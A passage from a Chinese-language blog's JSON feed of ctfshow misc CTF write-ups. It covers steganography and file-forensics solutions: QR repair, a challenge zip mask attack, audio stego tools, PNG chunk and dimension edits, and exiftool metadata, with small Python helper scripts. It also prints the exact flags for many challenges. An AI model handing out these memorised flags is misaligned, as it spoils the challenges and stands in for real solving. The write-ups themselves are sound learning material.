图片</p>\n<p>将其复制到 010，生成图片文件</p>\n<p>打开，只有色彩，使用 nipet</p>\n<pre><code class=\"language-base\">nipet 抽象画.png\n</code></pre>\n<p>得到 <code>ctfshow&#123;dec8de_frejnv_frejer89&#125;</code></p>\n<h1 id=\"迅疾响应\"><a class=\"anchor\" href=\"#迅疾响应\">#</a> 迅疾响应</h1>\n<p>正常二维码扫不出来，用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXJyaWN4LmdpdGh1Yi5pby9xcmF6eWJveC8=\"> Qrazybox</span> 扫</p>\n<p>把纠错区给涂白了，再让 Qrazybox 扫一次。</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/misc/%E8%BF%85%E7%96%BE%E5%93%8D%E5%BA%94.png\" alt=\"迅疾响应\" /></p>\n<p><code>ctfshow&#123;11451419-1981-landexiangle&#125;</code></p>\n<h1 id=\"我可没有骗你\"><a class=\"anchor\" href=\"#我可没有骗你\">#</a> 我可没有骗你</h1>\n<p>直接上 ARCHPR 掩码攻击，得到密码 55813329</p>\n<p>然后得到一个音频文件，虽然是 mp3 后缀，拖进 010editor 查看，其实这玩意是个 wav 格式的文件，改后缀</p>\n<p>然后用 Silent eye，Sound qualit 选择 high</p>\n<p>然后就得到 flag 啦</p>\n<p aha_cdsc_jejcfe5rj_cjfr24J=\"\">ctfshow</p>\n<h1 id=\"你被骗了\"><a class=\"anchor\" href=\"#你被骗了\">#</a> 你被骗了</h1>\n<p>属性的副标题里有个 flag，这个是假 flag</p>\n<p>用 MP3Stego</p>\n<p>Decode.exe -X -P nibeipianle nibeipianle.mp3</p>\n<p>得到 flag</p>\n<p><code>ctfshow&#123;chdv_1dcs_cjksnjn_NJDSjdcdjn&#125;</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/10/CTF/ctfshow/Misc%E5%85%A5%E9%97%A8/",
            "url": "http://dpm12345.github.io/2022/10/10/CTF/ctfshow/Misc%E5%85%A5%E9%97%A8/",
            "title": "Misc入门",
            "date_published": "2022-10-10T15:12:29.000Z",
            "content_html": "<h1 id=\"图片篇-基础操作\"><a class=\"anchor\" href=\"#图片篇-基础操作\">#</a> 图片篇 (基础操作)</h1>\n<h2 id=\"misc1\"><a class=\"anchor\" href=\"#misc1\">#</a> misc1</h2>\n<p>图片就是</p>\n<h2 id=\"misc2\"><a class=\"anchor\" href=\"#misc2\">#</a> misc2</h2>\n<p>直接打开，发现 png 头，改 <code>.png</code> ，打开得到 flag</p>\n<h2 id=\"misc3\"><a class=\"anchor\" href=\"#misc3\">#</a> misc3</h2>\n<p>010 打开，bpg 头</p>\n<p>bpgviewer 安装打开得到 flag</p>\n<h2 id=\"misc4\"><a class=\"anchor\" href=\"#misc4\">#</a> misc4</h2>\n<p>一开始以为是文件合并，之后发现是 txt 均为图片，修改后缀打开获得 flag</p>\n<h1 id=\"图片篇-信息附加\"><a class=\"anchor\" href=\"#图片篇-信息附加\">#</a> 图片篇 (信息附加)</h1>\n<h2 id=\"misc5\"><a class=\"anchor\" href=\"#misc5\">#</a> misc5</h2>\n<p>图片显示没有 flag，用 010 打开，拉到最后，可以看到 flag</p>\n<h2 id=\"misc6\"><a class=\"anchor\" href=\"#misc6\">#</a> misc6</h2>\n<p>同上一题，但 flag 在中间</p>\n<h2 id=\"misc7\"><a class=\"anchor\" href=\"#misc7\">#</a> misc7</h2>\n<p>同上题，直接搜</p>\n<h2 id=\"misc8\"><a class=\"anchor\" href=\"#misc8\">#</a> misc8</h2>\n<p>binwalk 能分析出来 png，但同样也弄出来 zlib，这里不准确</p>\n<ol>\n<li>\n<p>使用 foremost 分离 <code>foremost misc8.png -o ./misc8</code></p>\n</li>\n<li>\n<p>手动分离，能找到第二张图片位置为 <code>0xf34</code> ，手动复制或用 <code>dd</code>  命令</p>\n</li>\n</ol>\n<h2 id=\"misc9\"><a class=\"anchor\" href=\"#misc9\">#</a> misc9</h2>\n<p>解压后 010 打开图片，能直接找到 flag</p>\n<h2 id=\"misc10\"><a class=\"anchor\" href=\"#misc10\">#</a> misc10</h2>\n<p>binwalk 分离，第一个打开就是 flag</p>\n<h2 id=\"misc11\"><a class=\"anchor\" href=\"#misc11\">#</a> misc11</h2>\n<p>对于 png 图片，其关键数据块由</p>\n<ol>\n<li>文件头数据块 IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。</li>\n<li>调色板数据块 PLTE（palette chunk）：必须放在图像数据块之前。</li>\n<li>图像数据块 IDAT（image data chunk）：存储实际图像数据。PNG 数据允许包含多个连续的图像数据块。</li>\n<li>图像结束数据 IEND（image trailer chunk）：放在文件尾部，表示 PNG 数据流结束。</li>\n</ol>\n<p>这四个组成</p>\n<p>根据提示在另一张图片里，通过 010，可以看到有两个 IDAT 删去第一个，可以看到图片变化 ，出现 flag</p>\n<p>(或者使用 tweakpng 进行同样操作)</p>\n<h2 id=\"misc12\"><a class=\"anchor\" href=\"#misc12\">#</a> misc12</h2>\n<p>同上题，删去 IDAT 只不过要删去 8 个</p>\n<p>自己写了个批量删除脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"图片路径:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>out_folder <span class=\"token operator\">=</span> <span class=\"token string\">\"png_IDAT_out\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>os<span class=\"token punctuation\">.</span>mkdir<span class=\"token punctuation\">(</span>out_folder<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>out_folder<span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>content <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">\"&#123;&#125;.png\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>index <span class=\"token operator\">=</span> content<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">b\"IDAT\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>IHDR_end <span class=\"token operator\">=</span> index <span class=\"token operator\">-</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token string\">b\"IDAT\"</span> <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">[</span>index<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    index <span class=\"token operator\">=</span> content<span class=\"token punctuation\">[</span>index<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">b\"IDAT\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> index <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    data <span class=\"token operator\">=</span> content<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>IHDR_end<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> content<span class=\"token punctuation\">[</span>index <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    num <span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"正在生成第&#123;&#125;张图片\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>out_folder <span class=\"token operator\">+</span> <span class=\"token string\">\"/\"</span> <span class=\"token operator\">+</span> filename<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        f1<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"共生成&#123;&#125;张图片\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请在该脚本路径下的 &#123;&#125; 文件夹查看\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>out_folder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"misc13\"><a class=\"anchor\" href=\"#misc13\">#</a> misc13</h2>\n<p>010 打开，可以看到四段类 flag 的字符串，字符之间隔了一个字符</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c\u001at¹f…s†hªoKw°&#123;!a\u0014eS6¥eT34fxa%4Ý8ïf«5\u00102•8\u001fb‚1º7E4|2Td~7:2äeñ6úfõ4\u001e1\u00072\u001d9T8ñ328é0l&#125;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>c\u001at¹f…s†hªoKw°&#123;!1\u0014eS3¥eT24exd%4Ý8ïf«5\u00101•8\u001fb‚7ºeE4|2T6~7:däeñ1úcõ4\u001e1\u00072\u001daT8ñ329éal&#125;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c\u001at¹f…s†hªoKw°&#123;!a\u0014eS6¥eT34exa%4Ý8ïf«5\u00101•8\u001fb‚7ºeE4|2Td~7:däeñ6úfõ4\u001e1\u00072\u001dfT8ñ329éal&#125;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c\u001at¹f…s†hªoKw°&#123;!a\u0014eS6¥eT446xc%4Ý8ïf«7\u00103•9\u001fb‚7ºeEb|2Td~1:däeñ6úeõ4\u001e1\u00072\u001dfT8ñ329éal&#125;</pre></td></tr></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ctfshow&#123;ae6e3fa48f528b1742d72e6f41298380&#125;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ctfshow&#123;1e3e2ed48f518b7e4267de1c412a839a&#125;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ctfshow&#123;ae6e3ea48f518b7e42d7de6f412f839a&#125;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ctfshow&#123;ae6e46c48f739b7eb2d1de6e412f839a&#125;</pre></td></tr></table></figure><p>一个一个试，得到第三个正确</p>\n<h2 id=\"misc14\"><a class=\"anchor\" href=\"#misc14\">#</a> misc14</h2>\n<p>根据 binwalk 的分析，手动分离，在最后一个 jpg 找到 flag</p>\n<p><code>ctfshow&#123;ce520f767fc465b0787cdb936363e694&#125;</code></p>\n<h2 id=\"misc15\"><a class=\"anchor\" href=\"#misc15\">#</a> misc15</h2>\n<p>010 打开，可以看到 flag</p>\n<p><code>ctfshow&#123;fbe7bb657397e6e0a6adea3e40265425&#125;</code></p>\n<h2 id=\"misc16\"><a class=\"anchor\" href=\"#misc16\">#</a> misc16</h2>\n<p>binwalk 分离，在 DD4 文件中 <code>ctfshow&#123;a7e32f131c011290a62476ae77190b52&#125;</code></p>\n<h2 id=\"misc17\"><a class=\"anchor\" href=\"#misc17\">#</a> misc17</h2>\n<p>首先使用 zsteg</p>\n<p>显示 extradata:0</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>[?] 3544 bytes of extra data after zlib stream</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>extradata:0         .. </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    00000000: e1 1f 30 53 86 4f c5 a4  1b f5 e6 e5 c7 46 0a 92  |..0S.O.......F..|</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    00000010: 9b ee 72 e7 c9 9e b9 a7  74 de 92 4d ad 61 5b 58  |..r.....t..M.a[X|</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    00000020: f2 98 65 77 2b d2 d3 85  32 fc 08 83 86 1f 0f 1e  |..ew+...2.......|</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    00000030: cb ab ac 9c 4b ca 02 20  e2 ce e4 ae 60 1a 2c c6  |....K.. ....&#96;.,.|</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    00000040: 7b c8 9a 77 31 2f 9e 67  db d9 3e 53 fe 17 a5 50  |&#123;..w1&#x2F;.g..&gt;S...P|</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    00000050: 20 e5 1d 8c d5 49 4e 52  a5 54 31 cb 8b c5 3b 09  | ....INR.T1...;.|</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    00000060: a2 a6 fe 5b da 4f 9e 78  9c 5d 46 d6 e2 6b 6b 2a  |...[.O.x.]F..kk*|</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    00000070: f2 62 0c ba 70 19 a0 27  f3 84 77 99 02 77 05 79  |.b..p..&#39;..w..w.y|</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    00000080: 5b 44 b7 79 b3 54 11 a1  f3 54 34 56 7e ff 55 d1  |[D.y.T...T4V~.U.|</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    00000090: c6 39 90 c8 21 7f 26 39  44 58 78 c3 ed 37 4a 7c  |.9..!.&amp;9DXx..7J||</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    000000a0: 50 24 e8 79 7b 4b 9c fa  2a 2c bb e8 b9 fb 40 2c  |P$.y&#123;K..*,....@,|</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    000000b0: 50 05 21 4c 3b 29 65 b4  60 1c 27 bb 4c 16 bf f1  |P.!L;)e.&#96;.&#39;.L...|</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    000000c0: 77 c0 55 04 5e 25 0e 18  1e 58 ab 0f 13 11 f2 3f  |w.U.^%...X.....?|</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    000000d0: cf a0 32 b1 f5 a8 1b 99  a7 4b 46 89 cf 85 89 50  |..2......KF....P|</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    000000e0: 88 20 8f 4f fd e2 97 55  68 73 b4 96 ba dd 25 a3  |. .O...Uhs....%.|</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    000000f0: 83 72 3f 99 77 9e 0a 08  50 4f 11 8f 87 65 c0 29  |.r?.w...PO...e.)|</pre></td></tr></table></figure><p>显示有隐藏的额外信息</p>\n<p>再 <code>zsteg -e extradata:0 misc17.png &gt; 1.txt</code></p>\n<p>然后 binwalk，得到图片文件 <code>binwalk -e 1.txt</code></p>\n<h2 id=\"misc18\"><a class=\"anchor\" href=\"#misc18\">#</a> misc18</h2>\n<p>文件的属性中</p>\n<h2 id=\"misc19\"><a class=\"anchor\" href=\"#misc19\">#</a> misc19</h2>\n<p>010 找到 flag， <code>ctfshow&#123;dfdcf08038cd446a5eb50782f8d3605d&#125;</code></p>\n<p>或者 exiftool，在 <code>Document Name</code>  和 <code>Host Computer</code>  中</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Document Name                   : ctfshow&#123;dfdcf08038cd446a5</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Strip Offsets                   : 21688 25422</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Orientation                     : Horizontal (normal)</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Samples Per Pixel               : 3</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Rows Per Strip                  : 97</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Strip Byte Counts               : 3733 749</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>X Resolution                    : 72</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Y Resolution                    : 72</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Planar Configuration            : Chunky</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Resolution Unit                 : inches</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Software                        : Adobe Photoshop CC 2019 (Windows)</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Modify Date                     : 2021:03:25 10:35:18</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host Computer                   : eb50782f8d3605d&#125;</pre></td></tr></table></figure><h2 id=\"misc20\"><a class=\"anchor\" href=\"#misc20\">#</a> misc20</h2>\n<p><code>exiftool</code>  的 comment 字段</p>\n<h2 id=\"misc21\"><a class=\"anchor\" href=\"#misc21\">#</a> misc21</h2>\n<p>提示说在序号中，找到序号， <code>686578285826597329</code> ，尝试直接提交错误</p>\n<p>十六进制解码 <code>686578285826597329</code> ，得到 <code>hex(X&amp;Ys)</code></p>\n<p>而</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>X Resolution                    : 3902939465</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Y Resolution                    : 2371618619</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Page Name                       : https:&#x2F;&#x2F;ctf.show&#x2F;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X Position                      : 1082452817</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Y Position                      : 2980145261</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>x1 <span class=\"token operator\">=</span> <span class=\"token number\">3902939465</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>y1 <span class=\"token operator\">=</span> <span class=\"token number\">2371618619</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x2 <span class=\"token operator\">=</span> <span class=\"token number\">1082452817</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>y2 <span class=\"token operator\">=</span> <span class=\"token number\">2980145261</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>y1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>y2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>ctfshow&#123;e8a221498d5c073b4084eb51b1a1686d&#125;</code></p>\n<h2 id=\"misc22\"><a class=\"anchor\" href=\"#misc22\">#</a> misc22</h2>\n<p>flag 在图片里，缩略图隐写</p>\n<ol>\n<li>\n<p>叫做 thumbnail 隐写，用 Magicexif 打开，可以直接看到缩略图上黄色字体的 flag</p>\n</li>\n<li>\n<p>exiftool</p>\n<p><code>exiftool -ThumbnailImage -b misc22.jpg &gt; 1.jpg</code></p>\n</li>\n</ol>\n<p>得到 <code>ctfshow&#123;dbf7d3f84b0125e833dfd3c80820a129&#125;</code></p>\n<h2 id=\"misc23\"><a class=\"anchor\" href=\"#misc23\">#</a> misc23</h2>\n<p>exiftool 查看</p>\n<p>得到 <code>History Action : ctfshow&#123;&#125;, UnixTimestamp, DECtoHEX, getflag</code></p>\n<p>由此知从时间戳中获得 flag</p>\n<p>找到 <code>History When : 1997:09:22 02:17:02+08:00, 2055:07:15 12:14:48+08:00, 2038:05:05 16:50:45+08:00, 1984:08:03 18:41:46+08:00</code></p>\n<p>分别转为时间戳</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>874865822</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>2699237688</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>2156662245</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>460377706</pre></td></tr></table></figure><p>同 21 想法，分段转十六进制，得到 <code>ctfshow&#123;3425649ea0e31938808c0de51b70ce6a&#125;</code></p>\n<h2 id=\"misc41\"><a class=\"anchor\" href=\"#misc41\">#</a> misc41</h2>\n<p>根据提示的  <code>F001</code>  ，010 打开后，搜索  <code>F001</code></p>\n<p>根据高亮得到 flag (实在想不到)</p>\n<p><code>ctfshow&#123;fcbd427caf4a52f1147ab44346cd1cdd&#125;</code></p>\n<h1 id=\"图片篇-文件结构\"><a class=\"anchor\" href=\"#图片篇-文件结构\">#</a> 图片篇 (文件结构)</h1>\n<h2 id=\"misc24\"><a class=\"anchor\" href=\"#misc24\">#</a> misc24</h2>\n<p>010，修改图片高度，240 (EE) 可以看到 flag</p>\n<h2 id=\"misc25\"><a class=\"anchor\" href=\"#misc25\">#</a> misc25</h2>\n<p>同样修改高度，为 300</p>\n<h2 id=\"misc26\"><a class=\"anchor\" href=\"#misc26\">#</a> misc26</h2>\n<p>010 打开，显示 crc 错误，根据前面自己写的脚本，一张修改 crc，一张修改长宽，得到两张</p>\n<p>其中修改长宽为 <code>900 606</code></p>\n<p>在修改长宽的图片中发现 flag</p>\n<p>&lt;img src=&quot;/ 素材 /ctfshow/Misc/misc26_modify_width_height.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<h2 id=\"misc27\"><a class=\"anchor\" href=\"#misc27\">#</a> misc27</h2>\n<p>jpg</p>\n<p><code>FF C0</code>  后 第四、五为高，第六、七为宽</p>\n<p>如</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Misc/misc27_jpg.jpg\" alt=\"\" /></p>\n<p>010 打开修改高，位置 <code>0x9D</code> , 修改高度为 <code>300</code> ，即 <code>012c</code></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Misc/misc27.jpg\" alt=\"\" /></p>\n<h2 id=\"misc28\"><a class=\"anchor\" href=\"#misc28\">#</a> misc28</h2>\n<p>GIF 图，找到 <code>21 F9</code> , 之后的第十二个开始 2 个字节为宽，再 2 个字节为高</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Misc/misc28_gif.jpg\" alt=\"\" /></p>\n<p>修改高  <code>300</code>  ，得到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Misc/misc28.gif\" alt=\"\" /></p>\n<h2 id=\"misc29\"><a class=\"anchor\" href=\"#misc29\">#</a> misc29</h2>\n<p>修改所有的高 <code>300</code>  (可以搜索所有的 <code>21 F9</code> , 也可以根据第一个高，然后搜索，全部替换)，在第 8 帧中得到 flag</p>\n<h2 id=\"misc30\"><a class=\"anchor\" href=\"#misc30\">#</a> misc30</h2>\n<p>bmp 图片</p>\n<p><code>28 00 00 00</code>  后 4 个字节为宽，再 4 个字节为长</p>\n<ul>\n<li>\n<p>根据题目提示修改宽为 <code>950</code></p>\n</li>\n<li>\n<p>脚本一个一个试试到 <code>950</code></p>\n</li>\n</ul>\n<h2 id=\"misc31\"><a class=\"anchor\" href=\"#misc31\">#</a> misc31</h2>\n<p>打开图片显示不知名黑色点状，猜测为宽错了</p>\n<p>计算所以数据为 487256 字节，减去文件头 53，为 487203</p>\n<p>然后由于为 24 位，故 3 字节 1 像素</p>\n<p>那么像素个数为 <code>487203/3</code></p>\n<p>高为 <code>487203/3/150</code>  得到 <code>1082.673333.....</code></p>\n<p>那么改为 <code>1082</code></p>\n<p>图片正常显示，得到 flag</p>\n<h2 id=\"misc32\"><a class=\"anchor\" href=\"#misc32\">#</a> misc32</h2>\n<p>爆破得到新宽为 1044</p>\n<h2 id=\"misc33\"><a class=\"anchor\" href=\"#misc33\">#</a> misc33</h2>\n<p>同样爆破，得到 <code>978X142</code></p>\n<h2 id=\"misc34\"><a class=\"anchor\" href=\"#misc34\">#</a> misc34</h2>\n<p>同样爆破，由于 crc 不知道，宽从 900 开始，故枚举各种宽度，最终在 1123 得到正确图片</p>\n<h2 id=\"misc35\"><a class=\"anchor\" href=\"#misc35\">#</a> misc35</h2>\n<p>同 34 爆破，宽为 993，高为 500 左右时得到 flag</p>\n<h2 id=\"misc36\"><a class=\"anchor\" href=\"#misc36\">#</a> misc36</h2>\n<p>爆破宽度为 920-950，发现都无信息</p>\n<p>在爆破时适度加大高度到 300</p>\n<p>得到当宽度为 941 时，得到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Misc/misc36_941.jpg\" alt=\"\" /></p>\n<p><code>ctfshow&#123;1ebf739f832906d60f57436b8179166f&#125;</code></p>\n<h2 id=\"misc37\"><a class=\"anchor\" href=\"#misc37\">#</a> misc37</h2>\n<p>逐帧查看</p>\n<p>得到 <code>ctfshow&#123;2056782cd57b13261dcbbe3d6eecda17&#125;</code></p>\n<h2 id=\"misc38\"><a class=\"anchor\" href=\"#misc38\">#</a> misc38</h2>\n<p>使用 apng 库模块</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pathlib <span class=\"token keyword\">import</span> Path</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> apng</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>path <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file_path:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>img <span class=\"token operator\">=</span> apng<span class=\"token punctuation\">.</span>APNG<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>base_path <span class=\"token operator\">=</span> Path<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token string\">\"Extract_APNG2_out\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>base_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    os<span class=\"token punctuation\">.</span>mkdir<span class=\"token punctuation\">(</span>base_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>png<span class=\"token punctuation\">,</span>control<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token 